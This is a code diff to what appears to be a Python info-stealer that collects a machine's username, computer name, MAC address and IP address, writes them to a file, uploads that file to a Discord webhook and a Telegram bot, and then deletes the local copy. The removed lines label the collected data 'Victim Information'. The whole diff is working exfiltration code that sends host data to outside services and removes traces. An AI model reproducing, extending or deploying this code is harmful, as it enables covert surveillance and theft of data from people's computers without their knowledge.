@@ -1,7 +1,5 @@
 import os
 import requests
-from re import findall
-from Crypto.Cipher import AES
 from getmac import get_mac_address
 from pathlib import Path
 from dotenv import load_dotenv
@@ -10,6 +8,8 @@ from dotenv import load_dotenv
 dotenv_path = Path('env/.env')
 load_dotenv(dotenv_path=dotenv_path)
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 # Define environment keys
 windows_enviroment = {
@@ -34,32 +34,51 @@ def get_computer_information():
     os.makedirs(os.path.dirname(userprofile_path), exist_ok=True)
 
     # Write information to file
-    with open(userprofile_path, 'a+', encoding="utf-8") as inforead:
-        mem_history = inforead.read()
-        inforead.seek(0)
-        inforead.write(f'Username: {computer_user_name}\nComputer Name: {computer_name}\nComputer MAC Address: {computer_mac_address}\nIP Address: {ip_address}\n\n' + mem_history)
+    with open(userprofile_path, 'w+', encoding="utf-8") as inforead:
+        inforead.write(f'Username: {computer_user_name}\nComputer Name: {computer_name}\nComputer MAC Address: {computer_mac_address}\nIP Address: {ip_address}\n\n')
 
-    # Prepare Discord embedded message
-    discord_embeded = {
-        "title": "Victim Information", 
-        "description": "Computer Info", 
-        "color": 0, 
-        "fields": [
-            {"name": "User", "value": computer_user_name},
-            {"name": "Name", "value": computer_name},
-            {"name": "MAC Address", "value": computer_mac_address},
-            {"name": "IP Address", "value": ip_address}
-        ]
-    }
+    print(f"Computer information saved to {userprofile_path}")
 
-    latest_jsondata = {
-        "content": "",
-        "username": f"{computer_user_name} | {computer_name}",
-        "embeds": [discord_embeded],
-    }
+    return userprofile_path
 
-    # Send POST request to Discord webhook URL
-    response = requests.post(DISCORD_WEBHOOK_URL, json=latest_jsondata)
-    if response.status_code != 204:
-        print(f"Error sending to Discord: {response.status_code} - {response.text}")
+def send_info_to_discord(file_path, file_description):
+    try:
+        with open(file_path, 'rb') as file:
+            files = {'file': (os.path.basename(file_path), file)}
+            payload = {'content': file_description, 'username': 'Info Sender'}
+            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+            if response.status_code == 204:
+                print(f"File {file_path} successfully sent to Discord")
+            else:
+                print(f"Failed to send file {file_path} to Discord: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending file to Discord: {e}")
 
+def send_info_to_telegram(file_path, file_description):
+    try:
+        with open(file_path, 'rb') as file:
+            response = requests.post(
+                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
+                data={'chat_id': TELEGRAM_CHAT_ID, 'caption': file_description},
+                files={'document': file}
+            )
+            if response.status_code == 200:
+                print(f"File {file_path} successfully sent to Telegram")
+            else:
+                print(f"Failed to send file {file_path} to Telegram: {response.status_code}")
+    except Exception as e:
+        print(f"Error sending file to Telegram: {e}")
+
+def delete_file(file_path):
+    try:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+            print(f"Deleted file: {file_path}")
+    except Exception as e:
+        print(f"Error deleting file: {e}")
+
+if __name__ == "__main__":
+    info_file_path = get_computer_information()
+    send_info_to_discord(info_file_path, "Computer Information")
+    send_info_to_telegram(info_file_path, "Computer Information")
+    delete_file(info_file_path)
